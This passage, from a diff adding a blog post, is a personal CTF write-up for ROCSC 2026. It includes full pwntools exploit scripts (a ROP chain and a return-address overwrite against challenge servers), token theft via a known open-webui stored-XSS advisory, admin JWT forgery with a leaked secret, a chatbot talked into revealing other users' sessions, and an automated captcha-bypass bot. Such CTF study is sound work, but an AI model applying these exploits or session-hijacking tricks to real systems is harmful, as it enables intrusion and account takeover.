+                    <a href="#wonderful-strangers" aria-label="wonderful-strangers">wonderful-strangers</a></li>
+                <li>
+                    <a href="#art-gallery-heist-2" aria-label="art-gallery-heist-2">art-gallery-heist-2</a></li></ul>
+                </li>
+                <li>
+                    <a href="#steganography" aria-label="Steganography">Steganography</a><ul>
+                        
+                <li>
+                    <a href="#echoes_of_the_past" aria-label="echoes_of_the_past">echoes_of_the_past</a>
+                </li>
+            </ul>
+            </li>
+            </ul>
+        </div>
+    </details>
+</div>
+
+  <div class="post-content"><h1 id="intro">Intro<a hidden class="anchor" aria-hidden="true" href="#intro">#</a></h1>
+<p>This year&rsquo;s ROCSC was my first participation, and I ended up ranking 50, so I&rsquo;m pretty proud about my performance. Sadly, the competition was crazy in the junior section, as the only people who qualified were those with a full solve, which almost never happens. But seniors ranked below me <em>did</em> qualify, so I&rsquo;m a bit salty about that.</p>
+<p>What was unfortunate was the AI thing, which essentially made this pay-to-win, since most challenges <em>were</em> solvable using AI; just mindlessly pumping challenges into Claude and GPT isn&rsquo;t fun, but not doing so puts you at a great disadvantage to people who do so.</p>
+<p>Either way, this was a great learning experience and 3 very long days with very little sleep. So here is what I solved and how.</p>
+<h1 id="pwn">Pwn<a hidden class="anchor" aria-hidden="true" href="#pwn">#</a></h1>
+<p>I&rsquo;ll start with pwn because it&rsquo;s my favorite and what I solved first.</p>
+<h2 id="ropy">ropy<a hidden class="anchor" aria-hidden="true" href="#ropy">#</a></h2>
+<p><strong>ropy</strong> was a simple enough ORW pwn challenge, which means we aren&rsquo;t allowed to execute any syscalls except <em>open</em>, <em>read</em> and <em>write</em>. Yet that is enough to read the flag.</p>
+<p>But there was a fun twist which was the first function called, opening a huge random amount of fd (file descriptors). To <em>read</em> from flag.txt in the first place, we need to pass its fd as a parameter. Since it wasn&rsquo;t the usual 3, the only way to actually get it, without guessing, was through the return value of <code>open(flag.txt)</code>, passed in rax.</p>
+<p>To make this even more challenging, we only get a bunch of shit gadgets, all of which in libc.so.6, except for a <code>pop rdi; ret</code> to start the gadget chain from main.</p>
+<p><img alt="challenge-screenshot" loading="lazy" src="/writeup-blog/posts/rocsc2026/ropy1.png#center"></p>
+<p>So the action plan was:</p>
+<ul>
+<li>write &ldquo;flag.txt&rdquo; into bss</li>
+<li>open(&ldquo;flag.txt&rdquo;, 0, 0)</li>
+<li>retrieve rax, read(fd, bss+20, 100)</li>
+<li>write(1(stdout), bss+20, 100).</li>
+</ul>
+<p>With that in mind, here is the full script I used, which worked first try!</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+</span></span><span style="display:flex;"><span>elf <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#39;./main&#39;</span>)
+</span></span><span style="display:flex;"><span>p<span style="color:#f92672">=</span>elf<span style="color:#f92672">.</span>process()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>cyberedu <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;34.40.29.248:30946&#39;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>ip, port <span style="color:#f92672">=</span> cyberedu<span style="color:#f92672">.</span>split(<span style="color:#e6db74">&#39;:&#39;</span>)
+</span></span><span style="display:flex;"><span>port <span style="color:#f92672">=</span> int(port)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> args<span style="color:#f92672">.</span>REMOTE:
+</span></span><span style="display:flex;"><span>    p <span style="color:#f92672">=</span> remote(ip, port)
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">else</span>:
+</span></span><span style="display:flex;"><span>    p <span style="color:#f92672">=</span> elf<span style="color:#f92672">.</span>process()
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#avem doar read write open, flag.txt e chiar langa binary; </span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#main</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#pop rdi; rei</span>
+</span></span><span style="display:flex;"><span>pop_rdi_ret <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x401316</span>
+</span></span><span style="display:flex;"><span>ret <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x40101a</span>
+</span></span><span style="display:flex;"><span>puts_plt <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x401150</span>
+</span></span><span style="display:flex;"><span>puts_got <span style="color:#f92672">=</span> elf<span style="color:#f92672">.</span>got[<span style="color:#e6db74">&#39;puts&#39;</span>]
+</span></span><span style="display:flex;"><span>puts_offset <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x80e50</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>vuln <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x401566</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#bss</span>
+</span></span><span style="display:flex;"><span>flag_str <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x04040c0</span>
+</span></span><span style="display:flex;"><span>flag_buf <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x404200</span>   <span style="color:#75715e"># past BSS, writable page</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># get libc for gadgets;</span>
+</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;?</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#v1</span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;A&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">128</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#rbp</span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;B&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">8</span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> p64(pop_rdi_ret)
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> p64(puts_got)
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> p64(puts_plt)
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> p64(ret)
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> p64(vuln)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>sendline(payload)
+</span></span><span style="display:flex;"><span>data <span style="color:#f92672">=</span> p<span style="color:#f92672">.</span>recvline()<span style="color:#f92672">.</span>strip()
+</span></span><span style="display:flex;"><span>val <span style="color:#f92672">=</span> u64(data<span style="color:#f92672">.</span>ljust(<span style="color:#ae81ff">8</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#34;</span>))
+</span></span><span style="display:flex;"><span>print(hex(val))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>libc <span style="color:#f92672">=</span> val <span style="color:#f92672">-</span> puts_offset
+</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;Libc: </span><span style="color:#e6db74">{</span>hex(libc)<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#second gadget chain</span>
+</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;?</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#v1</span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;A&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">128</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#rbp</span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;B&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">8</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#gadgets from libc</span>
+</span></span><span style="display:flex;"><span>syscall <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x29db4</span> <span style="color:#f92672">+</span> libc
+</span></span><span style="display:flex;"><span>syscall_ret <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x91316</span> <span style="color:#f92672">+</span> libc
+</span></span><span style="display:flex;"><span>pop_rsi_ret <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x2be51</span> <span style="color:#f92672">+</span>libc
+</span></span><span style="display:flex;"><span>pop_rdx_r12_ret <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x011f357</span> <span style="color:#f92672">+</span> libc
+</span></span><span style="display:flex;"><span>mov_addr_rdx_rax_ret <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x03a410</span> <span style="color:#f92672">+</span> libc
+</span></span><span style="display:flex;"><span>pop_rax_ret <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x45eb0</span> <span style="color:#f92672">+</span> libc
+</span></span><span style="display:flex;"><span>pop_rcx_ret <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x3d1ee</span> <span style="color:#f92672">+</span> libc
+</span></span><span style="display:flex;"><span>pop_r8_mov_eax_1_ret <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x165a56</span> <span style="color:#f92672">+</span> libc
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#0x000000000005a272: mov rdi, rax; cmp rdx, rcx; jae 0x5a25c; mov rax, r8; ret; </span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#yeah i know shut up</span>
+</span></span><span style="display:flex;"><span>mov_rdi_rax_cmp_rdx_rcx_jae_5a25c_mov_rax_r8_ret <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x5a272</span> <span style="color:#f92672">+</span> libc
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#write to bss &#34;flag.txt\0\0&#34; to prepare for open</span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> p64(pop_rax_ret)
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> p64(<span style="color:#ae81ff">0x7478742e67616c66</span>)   <span style="color:#75715e"># &#34;flag.txt&#34;</span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> p64(pop_rdx_r12_ret)
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> p64(flag_str)
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> p64(<span style="color:#ae81ff">0x0</span>)
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> p64(mov_addr_rdx_rax_ret)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># write null terminator (next 8 bytes = 0)</span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> p64(pop_rax_ret)
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> p64(<span style="color:#ae81ff">0</span>)
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> p64(pop_rdx_r12_ret)
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> p64(flag_str <span style="color:#f92672">+</span> <span style="color:#ae81ff">8</span>)
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> p64(<span style="color:#ae81ff">0x0</span>)
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> p64(mov_addr_rdx_rax_ret)           <span style="color:#75715e"># [flag_str+8] = 0x00...</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#open</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># open(&#34;flag.txt&#34;, O_RDONLY) </span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> p64(pop_rdi_ret)
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> p64(flag_str)
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> p64(pop_rsi_ret)
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> p64(<span style="color:#ae81ff">0</span>)                     <span style="color:#75715e"># O_RDONLY</span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> p64(pop_rax_ret)
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> p64(<span style="color:#ae81ff">2</span>)                     <span style="color:#75715e"># SYS_open</span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> p64(syscall_ret)
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># rax = fd (unknown high number) </span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#so now we need to store that fd;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#prepping for the weird gadget&#39;s conditions, so we dont jmp smwhere else</span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> p64(pop_rcx_ret)
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> p64(<span style="color:#ae81ff">0xffffffff</span>)
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> p64(pop_rdx_r12_ret)
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> p64(<span style="color:#ae81ff">0</span>)
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> p64(<span style="color:#ae81ff">0</span>)
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#for now lets leave r8 alone;</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># turns out it was ok, didnt even need to modify it</span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> p64(mov_rdi_rax_cmp_rdx_rcx_jae_5a25c_mov_rax_r8_ret)
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#now rdi = fd</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># just pop rax = 0 right after</span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> p64(pop_rax_ret)
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> p64(<span style="color:#ae81ff">0</span>)                    <span style="color:#75715e"># SYS_read</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># now straight into read syscall</span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> p64(pop_rsi_ret)
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> p64(flag_buf)
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> p64(pop_rdx_r12_ret)
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> p64(<span style="color:#ae81ff">100</span>)
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> p64(<span style="color:#ae81ff">0</span>)
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> p64(syscall_ret)          <span style="color:#75715e"># read(fd, flag_buf, 100)</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#now write</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#  write(1, flag_buf, 100) </span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> p64(pop_rdi_ret)
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> p64(<span style="color:#ae81ff">1</span>)
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> p64(pop_rsi_ret)
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> p64(flag_buf)
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> p64(pop_rdx_r12_ret)
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> p64(<span style="color:#ae81ff">100</span>)
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> p64(<span style="color:#ae81ff">0</span>)
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> p64(pop_rax_ret)
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> p64(<span style="color:#ae81ff">1</span>)                     <span style="color:#75715e"># SYS_write</span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> p64(syscall_ret)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>sendline(payload)
+</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>interactive()
+</span></span></code></pre></div><p><img alt="challenge-screenshot" loading="lazy" src="/writeup-blog/posts/rocsc2026/first-try.png#center"></p>
+<h2 id="directory">directory<a hidden class="anchor" aria-hidden="true" href="#directory">#</a></h2>
+<p>This one was also particularly interesting, but I didn&rsquo;t really understand how the stack layout looked properly, and I&rsquo;ll explain why in a minute.</p>
+<p>We had a menu, with options, out of which are interesting:</p>
+<ul>
+<li>Exit and return</li>
+<li>Add entry to directory (overflow, we can write 48 bytes instead of 20 or sth)</li>
+</ul>
+<p>We can add up to 9 entries, each at <code>memcpy(&amp;v2[20 * v1++ + 264], v2, v4[0]);</code>.</p>
+<p><img alt="challenge-screenshot" loading="lazy" src="/writeup-blog/posts/rocsc2026/dire1.png#center"></p>
+<p>But looking at the stack layout, this just completely overflows v2, and by the third entry we should already be writing to <code>v2 + 320</code> where <code>rip</code> lives. Since we have a <code>win</code> function, we just need to change <code>rip</code>&rsquo;s lower bytes to <code>1537</code>, and that would be enough.</p>
+<p><img alt="challenge-screenshot" loading="lazy" src="/writeup-blog/posts/rocsc2026/dire2.png#center"></p>
+<p>But that wasn&rsquo;t the case, so either my math was wrong or IDA was wrong or whatever. But luckily, we can use <code>gef</code>. I determined that we only start writing into <code>rip</code> in the very last entry, so we just add 8 entries and in the 9th we can start our overflow. Again, I determined the exact value of padding through testing and not math.</p>
+<p>But here&rsquo;s a catch, since ASLR + PIE, the <code>1537</code> offset of <code>win</code> meant that the <code>1</code> part of it could end up as any value. And to avoid a segmentation fault because of stack alignment, we needed a <code>v538</code> to be more exact.</p>
+<p>I used <code>4538</code> but you get the idea; the script worked in about 10-20 tries when ASLR happened to make that byte <code>0x45</code>.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>context<span style="color:#f92672">.</span>binary <span style="color:#f92672">=</span> elf <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#34;./directory&#34;</span>)
+</span></span><span style="display:flex;"><span>context<span style="color:#f92672">.</span>log_level <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;info&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>p <span style="color:#f92672">=</span> remote(<span style="color:#e6db74">&#39;34.179.142.75&#39;</span>, <span style="color:#ae81ff">31046</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">add</span>(data):
+</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;&gt; &#34;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;1&#34;</span>)
+</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>sendafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;Enter name:&#34;</span>, data)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">exit_prog</span>():
+</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;&gt; &#34;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;4&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#mai intai adaugam cv random</span>
+</span></span><span style="display:flex;"><span>add(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;A&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">48</span>)
+</span></span><span style="display:flex;"><span>add(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;A&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">48</span>)
+</span></span><span style="display:flex;"><span>add(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;A&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">48</span>)
+</span></span><span style="display:flex;"><span>add(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;A&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">48</span>)
+</span></span><span style="display:flex;"><span>add(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;A&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">48</span>)
+</span></span><span style="display:flex;"><span>add(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;A&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">48</span>)
+</span></span><span style="display:flex;"><span>add(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;A&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">48</span>)
+</span></span><span style="display:flex;"><span>add(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;A&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">48</span>)
+</span></span><span style="display:flex;"><span>add(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;A&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">48</span>)
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#the 4 bytes of rbp there yea</span>
+</span></span><span style="display:flex;"><span>add(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;C&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">36</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;D&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">4</span> <span style="color:#f92672">+</span> p16(<span style="color:#ae81ff">0x4538</span>))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>interactive()
+</span></span></code></pre></div><p><img alt="challenge-screenshot" loading="lazy" src="/writeup-blog/posts/rocsc2026/100-try.png#center"></p>
+<h1 id="web">Web<a hidden class="anchor" aria-hidden="true" href="#web">#</a></h1>
+<h2 id="y">Y<a hidden class="anchor" aria-hidden="true" href="#y">#</a></h2>
+<p>The intended solve for this was through XSS through CSS, and somehow getting the admin to send us html data from one of his pages. But the author forgot to change his JWT secret in the source code so we can just forge our own cookie with the admin&rsquo;s user id.</p>
+<p><img alt="challenge-screenshot" loading="lazy" src="/writeup-blog/posts/rocsc2026/secret.png#center"></p>
+<p><img alt="challenge-screenshot" loading="lazy" src="/writeup-blog/posts/rocsc2026/Y.png#center"></p>
+<h2 id="open-tellmewhy">open-tellmewhy<a hidden class="anchor" aria-hidden="true" href="#open-tellmewhy">#</a></h2>
+<p>This was another interesting one, a stored XSS challenge, in open-webui version 6.5. Searching for CVEs found in that specific version, we bump into <a href="https://github.com/open-webui/open-webui/security/advisories/GHSA-9f4f-jv96-8766">this one</a>.</p>
+<p>The only thing we needed to modify was the <code>${WEBUI_BASE_URL}</code>, which was just <code>&quot;&quot;</code> (I mean empty). We just report the page and fetch the admin&rsquo;s token, and log in as him (or her!).</p>
+<p><img alt="challenge-screenshot" loading="lazy" src="/writeup-blog/posts/rocsc2026/yes.png#center"></p>
+<p>The flag was here:</p>
+<p><img alt="challenge-screenshot" loading="lazy" src="/writeup-blog/posts/rocsc2026/FLUUG.png#center"></p>
+<p>I was genuinely so happy when I finally solved this.</p>
+<h1 id="mlai">ML/AI<a hidden class="anchor" aria-hidden="true" href="#mlai">#</a></h1>
+<p>Sadly I didn&rsquo;t solve this in time, I was pretty close, I found out the hidden sessions, but the lack of sleep finally caught up to me at 5 am and I told myself I&rsquo;d do it in the morning at 9 (<em>yeah right</em>).</p>
+<p>What was happening that threw me off was that only <em>sometimes</em> the AI would actually change our session to a specified id. The reason is because I was saying &lsquo;switch me to session &lt;id&gt;&rsquo; instead of &lsquo;switch me to &lt;id&gt;&rsquo;. Yeah, I know.</p>
+<p>Asking to list sessions would list all the sessions, and the lucky one was <code>m3n4o5p6</code>. Refreshing the page after getting the token showed all previous messages.</p>
+<p><img alt="challenge-screenshot" loading="lazy" src="/writeup-blog/posts/rocsc2026/gpt.png#center"></p>
+<p>The flag was <code>ctf{4620c10465bb2c85c2bc9804972bb75c1d72a4782100d09d1a0bb72eb576b772}</code>.</p>
+<h1 id="misc">Misc<a hidden class="anchor" aria-hidden="true" href="#misc">#</a></h1>
+<h2 id="clanker-casino">clanker casino<a hidden class="anchor" aria-hidden="true" href="#clanker-casino">#</a></h2>
+<p>Another really interesting challenge - we log into an account starting with 1 coin. We can bet any number of our coins, with the clanker casino policy of double-or-nothing.</p>
+<p>The catch here was a captcha (hahaha get it), with a simple sum of two numbers that was rendered differently than the one in the HTML. And of course, to not bot, the rendered one was correct. So I had Claude Premium code us a playwright bot (which can see rendered) with a bunch of threads &ndash; because I didn&rsquo;t get a 32GB RAM laptop for nothing &ndash; that logs in on a new account, with this betting logic:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">get_bet</span>(coins):
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> coins <span style="color:#f92672">&gt;=</span> <span style="color:#ae81ff">160</span>:
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> max(<span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">200</span> <span style="color:#f92672">-</span> coins)
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> coins <span style="color:#f92672">&lt;=</span> <span style="color:#ae81ff">4</span>:
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> coins
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> coins <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">16</span>:
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">2</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> coins <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">40</span>:
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">2</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> coins <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">80</span>:
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">4</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">16</span>
+</span></span></code></pre></div><p>Another hurdle was the font, <code>editundo.ttf</code>, with crappy, unique and hard to recognize numbers and symbols.</p>
+<p>Now, Claude was really clever with this; It used <em>pixel fingerprinting</em>. Playwright takes a screensot of just the <code>.captcha-container</code> element, turns it to black and white and puts each dark pixel area inside a box.</p>
+<p>If it finds a fully white column in the image, it considers it as a space between characters, and slices out each character as a separate image (17x26). Then, it&rsquo;s converted into this binary tuple (I know it sounds a little complicated but it&rsquo;s just a hash with 0 or 1 for each pixel, so it produces a special hash for each of the characters to recognize them faster).</p>
+<p>Also the symbol in the middle was always regarded as a plus.</p>
+<p>Then, it looks it up in a <code>DIGIT_MAP</code>. This <code>DIGIT_MAP</code> is essentially an array of all these hashes. It starts as empty, and it displays each character in ASCII in the terminal for the user to write what the number character is, if it hasn&rsquo;t seen it before.</p>
+<p>Then, when the map is done, the Playwright friend of our can bypass the captcha by itself, and, you&rsquo;ll get the flag at 200 coins!</p>
+<p>This script launched 10 workers and got the flag in <em>seconds</em>. But depending on your luck, it could take longer.</p>
+<p><img alt="challenge-screenshot" loading="lazy" src="/writeup-blog/posts/rocsc2026/web.png#center"></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> re
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> asyncio
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> itertools
